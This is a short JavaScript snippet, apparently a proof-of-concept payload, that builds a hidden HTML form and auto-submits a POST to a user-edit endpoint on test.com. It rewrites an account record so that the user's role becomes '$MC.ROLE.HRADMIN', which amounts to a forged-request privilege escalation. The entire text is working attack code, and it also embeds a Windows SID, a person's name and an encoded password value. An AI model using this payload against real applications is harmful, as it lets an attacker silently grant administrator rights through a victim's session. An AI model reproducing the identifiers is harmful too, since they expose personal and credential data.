(function test() {
    var f = document.createElement('form');
    f.method = 'POST';
    f.action = 'https://test.com/CRS.UI.Web/User/Edit';
    var params = {
        'UserId': '1488',
        'UserSid': 'S-1-5-21-3090755164-1501800488-1772020393-17375',
        'UserType': 'FS',
        'UserName': 'Laga_DP181',
        'Title': 'Mr.',
        'FirstName': 'I Kadek Laga Dwi Pandika',
        'LastName': 'GuntaraTest',
        'Password': 'l7opDQlKgZGqgtEyANE%2BK%2B6ypXGfUCMv5%2FBVzu0R8Ua6%2FoIzENimYEFmvTN8LdPb',
        'Department': '',
        'PhoneNumber': '',
        'FaxNumber': '',
        'Email': '',
        'Status': 'A',
        'AccountStartDate': '18/02/2020',
        'AccountEndDate': '',
        'LanguagePref': 'en-AU',
        'DefaultRoleId': '1',
        'Vers': '17',
        'OldPassword': '',
        'NewPassword': '',
        'VerifyPassword': '',
        'page': '1',
        'SecUserRoles[0].UserId': '1488',
        'SecUserRoles[0].RoleId': '1',
        'SecUserRoles[0].RoleName': '$MC.ROLE.HRADMIN',
        'SecUserRoles[0].InclWarehouseAuthorisation': 'N',
        'oldPwd': '',
        'newPwd': '',
        'verify': ''
    };
    for (var key in params) {
        if (params.hasOwnProperty(key)) {
            var i = document.createElement('input');
            i.type = 'hidden';
            i.name = key;
            i.value = params[key];
            f.appendChild(i);
        }
    }
    document.body.appendChild(f);
    f.submit();
})();
